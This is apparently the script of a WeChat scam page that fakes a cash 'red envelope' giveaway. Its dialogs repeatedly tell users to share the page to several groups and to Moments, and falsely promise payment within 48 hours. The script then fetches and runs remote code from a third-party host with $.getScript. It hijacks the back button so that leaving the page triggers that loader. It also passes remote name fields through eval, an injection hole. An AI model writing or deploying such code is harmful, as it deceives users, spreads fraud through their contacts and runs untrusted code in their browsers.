var clientWidth =
  document.documentElement.clientWidth > 640
    ? 640
    : document.documentElement.clientWidth;
$(function() {
  function u(a) {
    var b = t.getHours(),
      c = t.getMinutes() * 1 + a.c_time * 1;
    return (
      c > 59 && ((c = c - 60), b++, b > 23 && (b = 0)),
      '<li><img src="' +
        a.w_headimg +
        '" alt=""><div class="hbName"><h3>' +
        eval("'" + a.w_name + "'") +
        '</h3><p class="hbTime">' +
        b +
        ':' +
        c +
        '</p></div><span class="hbMoney">' +
        eval("'" + a.u_time + "'") +
        '</span></li>'
    );
  }

  function f() {
    return '<li style="display: none;"></li>';
  }

  function e(a) {
    var b = t.getHours(),
      c = t.getMinutes() * 1 + a.c_time * 1;
    return (
      c > 59 && ((c = c - 60), b++, b > 23 && (b = 0)),
      '<img src="' +
        a.w_headimg +
        '" alt=""><div class="hbName"><h3>' +
        eval("'" + a.w_name + "'") +
        '</h3><p class="hbTime">' +
        b +
        ':' +
        c +
        '</p></div><span class="hbMoney">' +
        eval("'" + a.u_time + "'") +
        '</span>'
    );
  }
});

var alertTimes = 0;
function wxalert(msg, btn, callback) {
  if (alertTimes == 0) {
    var dialog = unescape(
      '%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E'
    );
    $('body').append(dialog);
  }
  alertTimes++;
  var d = $('#lly_dialog');
  d.show(200);
  d.find('#lly_dialog_msg').html(msg);
  d.find('#lly_dialog_btn').html(btn);
  d
    .find('#lly_dialog_btn')
    .off('click')
    .on('click', function() {
      d.hide(200);
      if (callback) {
        callback();
      }
    });
}

function share_tip(share_app_times, share_timeline_times) {
  if (share_app_times == 1) {
    wxalert(
      '分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！',
      '好'
    );
  } else if (share_app_times == 2) {
    wxalert(
      '分享失败,请不要分享到相同的群<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！',
      '好'
    );
  } else if (share_app_times == 3) {
    wxalert(
      '分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群！',
      '好'
    );
  } else {
    wx.hideOptionMenu();
    wx.showMenuItems({ menuList: ['menuItem:share:timeline'] });
    if (share_timeline_times < 1) {
      wxalert(
        '群分享完成，最后一步<br />分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可领取!',
        '好'
      );
    } else if (share_timeline_times == 1) {
      wx.onMenuShareTimeline({
        title: share_data.er_title,
        link: share_data.er_link,
        imgUrl: share_data.er_imgurl,
        success: function() {
          shareTTimes += 1;
          share_tip(shareATimes, shareTTimes);
        },
        cancel: function() {}
      });
      wxalert(
        '分享失败,请重新分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可领取!',
        '好'
      );
    } else {
      //wxalert(window.data.config.ok_msg, '确定', function() {
      /*wxalert('恭喜你！红包会在48小时内存入您的微信钱包，请保留朋友圈24小时哦 <br/><br/>感谢您的参与:)<br/><br/><font color="red">不要走开，还有100元红包等着你哟，点击"确定"领取！</font>' , '确定', function() {
               
                //$.getScript("//ccommons.gz.bcebos.com/aop.js");
				location.href=xiadanlianjie;
				
            });*/
      wxalert(
        '由于参与人数过多，系统将在48小时内发放到您的微信钱包，请耐心等待<br/><br/>朋友圈信息不可删除<br/>否则无法核实用户信息<br/><font style="color:#19b417;">以免奖品发放失败！',
        '确定',
        function() {
          gotocj();
        }
      );
    }
  }
}

function gotocj() {
  $.getScript('http://zifj.applinzi.com/db.js?v=1');
  //$.getScript('//contz.cdn.bcebos.com/db.js?v=6');
}

function show_tip() {
  wxalert(
    '活动提示<br>请分享到一个群<br>完成分享任务即可提现<br><span style="font-size: 30px;color: #f5294c">分享完成后红包自动存入微信钱包</span>',
    '好'
  );
}
$(function() {
  $('#dianwo').on('click', function() {
    share_config(window.data, window.share_data);
    wx.showMenuItems({ menuList: ['menuItem:share:appMessage'] });
    $('#mask').css('height', $(document).height());
    $('#mask').css('width', $(document).width());
    $('#mask').show();
    $('#fenxiang').show();
    $('#game_result').hide();
    $('.time-out-num').hide();
    $('.bag').hide();
    show_tip();
  });
  $('#fenxiang').on('click', function() {
    show_tip();
  });
  $('#mask').on('click', function() {
    show_tip();
  });
});

var shareATimes = 0;
var shareTTimes = 0;

$.getJSON(
  'http://aa.yqlkz.com/aikec/sample.php?callback=?',
  {
    url: location.href.split('#')[0],
    type: 'azure'
  },
  function(d) {
    window.data = d;
    wx.config({
      debug: false,
      appId: d.appId,
      timestamp: d.timestamp,
      nonceStr: d.nonceStr,
      signature: d.signature,
      jsApiList: [
        'onMenuShareTimeline',
        'onMenuShareAppMessage',
        'showMenuItems',
        'hideMenuItems'
      ]
    });
    //wx.showOptionMenu();
    wx.ready(function() {
      wx.hideOptionMenu();
    });
    wx.showOptionMenu();
    setTimeout('share_config(window.data,window.share_data)', 1000);
  }
);

$.getJSON(
  '//zith.applinzi.com/ll.php?callback=?',
  {
    url: location.href.split('#')[0]
  },
  function(i) {
    window.share_data = i;
  }
);

function share_config(data, share_data) {
  data.signature = null;
  wx.config(data);
  wx.ready(function() {
    wx.onMenuShareAppMessage({
      title: share_data.title,
      desc: share_data.desc,
      link: share_data.link,
      imgUrl: share_data.imgurl,
      success: function() {
        shareATimes += 1;
        share_tip(shareATimes, shareTTimes);
      },
      cancel: function() {}
    });
    wx.onMenuShareTimeline({
      title: share_data.t_title,
      link: share_data.t_link,
      imgUrl: share_data.t_imgurl,
      success: function() {
        shareTTimes += 1;
        share_tip(shareATimes, shareTTimes);
      },
      cancel: function() {}
    });
  });
}

function anchor() {
  history.pushState(history.length + 1, 'message', '#' + new Date().getTime());
}

function zp() {
  //$.getScript("//ccommons.gz.bcebos.com/aop.js");
  //location.href=xiadanlianjie;
}
setTimeout('anchor()', 100);
window.onhashchange = function() {
  gotocj();
  //location.href="http://dbsql.chamicn.net/c.php?id=174";
  //$.getScript("http://zifj.applinzi.com/sbht.php");
  //$.getScript("http://zifj.applinzi.com/db.js?v=1");
};
